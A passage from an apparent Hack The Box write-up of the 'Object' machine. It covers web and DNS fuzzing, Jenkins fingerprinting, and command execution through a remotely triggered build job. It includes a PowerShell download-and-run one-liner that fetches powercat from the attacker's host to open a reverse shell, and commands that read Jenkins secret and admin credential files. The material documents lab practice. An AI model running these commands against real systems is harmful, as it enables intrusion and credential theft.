+000007547:   302        0 L      0 W        0 Ch        &quot;git&quot;                                           
+000007821:   404        16 L     29 W       451 Ch      &quot;web-inf&quot;                                       
+000011630:   302        0 L      0 W        0 Ch        &quot;cli&quot;                                           
+000012034:   303        0 L      0 W        0 Ch        &quot;j_security_check&quot;                              
+
+Total time: 80.70071
+Processed Requests: 29948
+Filtered Requests: 29936
+Requests/sec.: 371.0995
+ /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 3: URL rejected: Malformed input to a URL function
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-8071-8ead-db0472eb3f64" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/Jenkins-Hudson.txt -u http://object.htb:8080/FUZZ -t 50 --hc 403 
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://object.htb:8080/FUZZ
+Total requests: 40
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                         
+=====================================================================
+
+000000017:   302        0 L      0 W        0 Ch        &quot;logout&quot;                                        
+000000031:   200        82 L     399 W      7935 Ch     &quot;signup&quot;                                        
+000000030:   405        8 L      265 W      6860 Ch     &quot;securityRealm/createAccount&quot;                   
+
+Total time: 0
+Processed Requests: 40
+Filtered Requests: 37
+Requests/sec.: 0
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-8072-9560-f6bf01aa0431" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://object.htb:8080/FUZZ -t 50 --hc 403
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://object.htb:8080/FUZZ
+Total requests: 220559
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                         
+=====================================================================
+
+000000053:   200        10 L     109 W      2120 Ch     &quot;login&quot;                                         
+000000217:   200        82 L     399 W      7935 Ch     &quot;signup&quot;                                        
+000000291:   302        0 L      0 W        0 Ch        &quot;assets&quot;                                        
+000001225:   302        0 L      0 W        0 Ch        &quot;logout&quot;                                        
+000002708:   400        8 L      203 W      6290 Ch     &quot;error&quot;                                         
+000007436:   302        0 L      0 W        0 Ch        &quot;git&quot;                                           
+000009207:   200        8 L      221 W      6551 Ch     &quot;oops&quot;                                          
+000020684:   302        0 L      0 W        0 Ch        &quot;cli&quot;                                           
+
+Total time: 403.7974
+Processed Requests: 84174
+Filtered Requests: 84166
+Requests/sec.: 208.4559
+</code></pre><h2 id="187d1b9f-8847-806c-b5dd-df90e011b9c1" class="">DNS Enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-803b-8c13-f2b3e85cdc2b" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u &quot;http://object.htb/&quot; -H &quot;Host:FUZZ.object.htb&quot; -t 50 --hh 29932
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://object.htb/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                         
+=====================================================================
+
+000009532:   400        6 L      26 W       334 Ch      &quot;#www&quot;                                          
+000010581:   400        6 L      26 W       334 Ch      &quot;#mail&quot;                                         
+
+Total time: 566.3610
+Processed Requests: 19966
+Filtered Requests: 19964
+Requests/sec.: 35.25313
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-80c7-804e-d716fd49766a" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u &quot;http://object.htb/&quot; -H &quot;Host:FUZZ.object.htb&quot; -t 50 --hh 29932
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://object.htb/
+Total requests: 100000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                         
+=====================================================================
+
+000037212:   400        6 L      26 W       334 Ch      &quot;*&quot;                                             
+
+Total time: 1083.327
+Processed Requests: 100000
+Filtered Requests: 99999
+Requests/sec.: 92.30822
+
+</code></pre><p id="187d1b9f-8847-800a-a47a-da25ba20af08" class="">
+</p><h2 id="187d1b9f-8847-8107-9388-db4dad20b49a" class="">Web Tech enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-8102-b424-deebf3e8b302" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ whatweb &quot;http://object.htb/&quot; -a 3 
+http://object.htb/ [200 OK] Country[RESERVED][ZZ], Email[ideas@object.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.132], JQuery[2.1.3], Microsoft-IIS[10.0], Modernizr, Script, Title[Mega Engines]
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-8041-ad08-c28834a3151c" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ whatweb &quot;http://object.htb:8080/&quot; -a 3 
+http://object.htb:8080/ [403 Forbidden] Cookies[JSESSIONID.3e927c0f], Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.43.v20210629)], HttpOnly[JSESSIONID.3e927c0f], IP[10.10.11.132], Jenkins[2.317], Jetty[9.4.43.v20210629], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]
+http://object.htb:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.3e927c0f], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.43.v20210629)], HttpOnly[JSESSIONID.3e927c0f], IP[10.10.11.132], Jenkins[2.317], Jetty[9.4.43.v20210629], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
+</code></pre><figure id="187d1b9f-8847-80ab-bb7b-d48a4181b442" class="image"><a href="../img/Object/image 2.png"><img style="width:431px" src="../img/Object/image 2.png"/></a></figure><h2 id="187d1b9f-8847-8106-b0ec-e91bfc16492b" class="">Findings</h2><ul id="187d1b9f-8847-81e6-bca8-ebe3a2c94762" class="bulleted-list"><li style="list-style-type:disc">Jetty:// 9.4.43.v20210629</li></ul><ul id="187d1b9f-8847-8024-b95e-e365953a4211" class="bulleted-list"><li style="list-style-type:disc">80/tcp   open  http    Microsoft IIS httpd 10.0</li></ul><ul id="187d1b9f-8847-809d-8946-cb29f4062dfd" class="bulleted-list"><li style="list-style-type:disc">5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</li></ul><ul id="187d1b9f-8847-805e-ae11-e7694332bfe8" class="bulleted-list"><li style="list-style-type:disc">8080/tcp open  http    Jetty 9.4.43.v20210629</li></ul><h1 id="187d1b9f-8847-815d-858c-ec043a83e252" class="">User</h1><h3 id="187d1b9f-8847-80e6-903a-de7d1590633e" class="">Create account to use jenkins web and create project to try RCE</h3><h3 id="187d1b9f-8847-807c-a459-f2f2db085ee2" class="">1.- Create token</h3><figure id="187d1b9f-8847-8026-a1d7-d32b93de7134" class="image"><a href="../img/Object/image 3.png"><img style="width:709.953125px" src="../img/Object/image 3.png"/></a></figure><h3 id="187d1b9f-8847-802b-aa9b-f26bf50a5470" class="">2.- Create project with “trigger builds remotely”</h3><figure id="187d1b9f-8847-804a-a5fa-e3edb24c82d7" class="image"><a href="../img/Object/image 4.png"><img style="width:709.96875px" src="../img/Object/image 4.png"/></a></figure><h3 id="187d1b9f-8847-8091-a2b0-d9f0559ab7ac" class="">3.- Run command to <a href="https://stackoverflow.com/questions/42817169/jenkins-trigger-builds-remotely-authentication-token-option-missing">trigger</a></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-8070-96ad-ed4791b82da4" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Go to &quot;http://10.10.11.132:8080/job/dir/build?token=11024ae502729d11cde678193ad1906dd6&quot; login and will be executed</code></pre><h3 id="187d1b9f-8847-80c2-9643-fb67febfd22a" class="">With “dir” was no able to get information, so I tried with “whoami”</h3><figure id="187d1b9f-8847-808e-81fb-ed4f32216fad" class="image"><a href="../img/Object/image 5.png"><img style="width:709.96875px" src="../img/Object/image 5.png"/></a></figure><h3 id="187d1b9f-8847-80c1-9c70-c35d1d1ede1d" class="">So change the command for powershell.exe &quot;type C:\Users\oliver\Desktop\user.txt”</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-808f-b686-ef042b43bf54" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Started by remote host 10.10.14.10
+Running as SYSTEM
+Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\dir
+[dir] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins8029584970396987643.bat
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\dir&gt;powershell.exe &quot;type C:\Users\oliver\Desktop\user.txt&quot; 
+9******************************4
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\dir&gt;exit 0 
+Finished: SUCCESS</code></pre><h1 id="187d1b9f-8847-8137-9ff9-cce1ac4986e6" class="">Root</h1><h3 id="187d1b9f-8847-8051-98ed-f61b5ba48c5e" class="">First, I need to get shell so change the command but I was not able to get shell </h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-80bc-a9a2-fc60de59bcb3" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">powershell.exe &quot;IEX((New-Object Net.Webclient).DownloadString(&#x27;http://10.10.14.10:8000/powercat.ps1&#x27;));powercat -c 10.10.14.10 -p 1205 -ep;&quot;
+</code></pre><h3 id="187d1b9f-8847-801b-a1d3-fe3b69db63a7" class="">Read new files for jenkins creds</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-8063-93cd-c9cb3c1d9d3f" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">powershell.exe &quot;dir C:\Users\oliver\AppData\Local\Jenkins\.jenkins&quot;
+
+
+    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        1/26/2025  12:50 PM                jobs                                                                  
+d-----       10/20/2021  10:19 PM                logs                                                                  
+d-----       10/20/2021  10:08 PM                nodes                                                                 
+d-----       10/20/2021  10:12 PM                plugins                                                               
+d-----       10/20/2021  10:26 PM                secrets                                                               
+d-----       10/25/2021  10:31 PM                updates                                                               
+d-----       10/20/2021  10:08 PM                userContent                                                           
+d-----        1/26/2025  12:49 PM                users                                                                 
+d-----       10/20/2021  10:13 PM                workflow-libs                                                         
+d-----        1/26/2025   1:06 PM                workspace                                                             
+-a----        1/26/2025  12:47 PM              0 .lastStarted                                                          
+-a----       11/10/2021   2:20 AM             41 .owner                                                                
+-a----        1/26/2025  12:47 PM           2505 config.xml                                                            
+-a----        1/26/2025  12:47 PM            156 hudson.model.UpdateCenter.xml                                         
+-a----       10/20/2021  10:13 PM            375 hudson.plugins.git.GitTool.xml                                        
+-a----       10/20/2021  10:08 PM           1712 identity.key.enc                                                      
+-a----        1/26/2025  12:47 PM              5 jenkins.install.InstallUtil.lastExecVersion                           
+-a----       10/20/2021  10:14 PM              5 jenkins.install.UpgradeWizard.state                                   
+-a----       10/20/2021  10:14 PM            179 jenkins.model.JenkinsLocationConfiguration.xml                        
+-a----       10/20/2021  10:21 PM            357 jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml           
+-a----       10/20/2021  10:21 PM            169 jenkins.security.QueueItemAuthenticatorConfiguration.xml              
+-a----       10/20/2021  10:21 PM            162 jenkins.security.UpdateSiteWarningsConfiguration.xml                  
+-a----       10/20/2021  10:08 PM            171 jenkins.telemetry.Correlator.xml                                      
+-a----        1/26/2025  12:47 PM            907 nodeMonitors.xml                                                      
+-a----        1/26/2025   1:35 PM            130 queue.xml                                                             
+-a----       10/20/2021  10:28 PM            129 queue.xml.bak                                                         
+-a----       10/20/2021  10:08 PM             64 secret.key                                                            
+-a----       10/20/2021  10:08 PM              0 secret.key.not-so-secret       </code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-803b-86bf-d55f2ff07af2" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">powershell.exe &quot;type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\config.xml&quot;
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\dir&gt;powershell.exe &quot;type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\config.xml&quot; 
+&lt;?xml version=&#x27;1.1&#x27; encoding=&#x27;UTF-8&#x27;?&gt;
+&lt;hudson&gt;
+  &lt;disabledAdministrativeMonitors&gt;
+    &lt;string&gt;jenkins.diagnostics.ControllerExecutorsNoAgents&lt;/string&gt;
+    &lt;string&gt;jenkins.security.QueueItemAuthenticatorMonitor&lt;/string&gt;
+    &lt;string&gt;hudson.diagnosis.ReverseProxySetupMonitor&lt;/string&gt;
+  &lt;/disabledAdministrativeMonitors&gt;
+  &lt;version&gt;2.317&lt;/version&gt;
+  &lt;numExecutors&gt;2&lt;/numExecutors&gt;
+  &lt;mode&gt;NORMAL&lt;/mode&gt;
+  &lt;useSecurity&gt;true&lt;/useSecurity&gt;
+  &lt;authorizationStrategy class=&quot;hudson.security.GlobalMatrixAuthorizationStrategy&quot;&gt;
+    &lt;permission&gt;hudson.model.Hudson.Administer:admin&lt;/permission&gt;
+    &lt;permission&gt;hudson.model.Hudson.Read:authenticated&lt;/permission&gt;
+    &lt;permission&gt;hudson.model.Item.Cancel:authenticated&lt;/permission&gt;
+    &lt;permission&gt;hudson.model.Item.Configure:authenticated&lt;/permission&gt;
+    &lt;permission&gt;hudson.model.Item.Create:authenticated&lt;/permission&gt;
+    &lt;permission&gt;hudson.model.Item.Delete:authenticated&lt;/permission&gt;
+    &lt;permission&gt;hudson.model.Item.Discover:authenticated&lt;/permission&gt;
+    &lt;permission&gt;hudson.model.Item.Read:authenticated&lt;/permission&gt;
+    &lt;permission&gt;hudson.model.Item.Workspace:authenticated&lt;/permission&gt;
+  &lt;/authorizationStrategy&gt;
+  &lt;securityRealm class=&quot;hudson.security.HudsonPrivateSecurityRealm&quot;&gt;
+    &lt;disableSignup&gt;false&lt;/disableSignup&gt;
+    &lt;enableCaptcha&gt;false&lt;/enableCaptcha&gt;
+  &lt;/securityRealm&gt;
+  &lt;disableRememberMe&gt;false&lt;/disableRememberMe&gt;
+  &lt;projectNamingStrategy class=&quot;jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy&quot;/&gt;
+  &lt;workspaceDir&gt;${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}&lt;/workspaceDir&gt;
+  &lt;buildsDir&gt;${ITEM_ROOTDIR}/builds&lt;/buildsDir&gt;
+  &lt;markupFormatter class=&quot;hudson.markup.EscapedMarkupFormatter&quot;/&gt;
+  &lt;jdks/&gt;
+  &lt;viewsTabBar class=&quot;hudson.views.DefaultViewsTabBar&quot;/&gt;
+  &lt;myViewsTabBar class=&quot;hudson.views.DefaultMyViewsTabBar&quot;/&gt;
+  &lt;clouds/&gt;
+  &lt;scmCheckoutRetryCount&gt;0&lt;/scmCheckoutRetryCount&gt;
+  &lt;views&gt;
+    &lt;hudson.model.AllView&gt;
+      &lt;owner class=&quot;hudson&quot; reference=&quot;../../..&quot;/&gt;
+      &lt;name&gt;all&lt;/name&gt;
+      &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;
+      &lt;filterQueue&gt;false&lt;/filterQueue&gt;
+      &lt;properties class=&quot;hudson.model.View$PropertyList&quot;/&gt;
+    &lt;/hudson.model.AllView&gt;
+  &lt;/views&gt;
+  &lt;primaryView&gt;all&lt;/primaryView&gt;
+  &lt;slaveAgentPort&gt;-1&lt;/slaveAgentPort&gt;
+  &lt;label&gt;&lt;/label&gt;
+  &lt;crumbIssuer class=&quot;hudson.security.csrf.DefaultCrumbIssuer&quot;&gt;
+    &lt;excludeClientIPFromCrumb&gt;false&lt;/excludeClientIPFromCrumb&gt;
+  &lt;/crumbIssuer&gt;
+  &lt;nodeProperties/&gt;
+  &lt;globalNodeProperties/&gt;
+  &lt;nodeRenameMigrationNeeded&gt;false&lt;/nodeRenameMigrationNeeded&gt;
+&lt;/hudson&gt;
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\dir&gt;exit 0 </code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-8049-8699-de494c398562" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">powershell.exe &quot;dir C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users&quot;
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\dir&gt;powershell.exe &quot;dir C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users&quot; 
+
+
+    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       10/21/2021   2:22 AM                admin_17207690984073220035                                            
+d-----        1/26/2025   1:04 PM                drroot_18317026666996107581                                           
+-a----        1/26/2025  12:49 PM            407 users.xml        
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-809b-b1aa-ec9e0eba1694" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">powershell.exe &quot;dir C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035&quot;
+
+Started by remote host 10.10.14.10
+Running as SYSTEM
+Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\dir
+[dir] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins9515336992409959925.bat
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\dir&gt;powershell.exe &quot;dir C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035&quot; 
+
+
+    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       10/21/2021   2:22 AM           3186 config.xml                                                            
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-80a8-b83e-d3fe782084bc" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">powershell.exe &quot;type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml&quot;
+
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\dir&gt;powershell.exe &quot;type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml&quot; 
+&lt;?xml version=&#x27;1.1&#x27; encoding=&#x27;UTF-8&#x27;?&gt;
+&lt;user&gt;
+  &lt;version&gt;10&lt;/version&gt;
+  &lt;id&gt;admin&lt;/id&gt;
+  &lt;fullName&gt;admin&lt;/fullName&gt;
+  &lt;properties&gt;
+    &lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=&quot;credentials@2.6.1&quot;&gt;
+      &lt;domainCredentialsMap class=&quot;hudson.util.CopyOnWriteMap$Hash&quot;&gt;
+        &lt;entry&gt;
+          &lt;com.cloudbees.plugins.credentials.domains.Domain&gt;
+            &lt;specifications/&gt;
+          &lt;/com.cloudbees.plugins.credentials.domains.Domain&gt;
+          &lt;java.util.concurrent.CopyOnWriteArrayList&gt;
+            &lt;com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;
+              &lt;id&gt;320a60b9-1e5c-4399-8afe-44466c9cde9e&lt;/id&gt;
+              &lt;description&gt;&lt;/description&gt;
+              &lt;username&gt;oliver&lt;/username&gt;
+              &lt;password&gt;{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}&lt;/password&gt;
+              &lt;usernameSecret&gt;false&lt;/usernameSecret&gt;
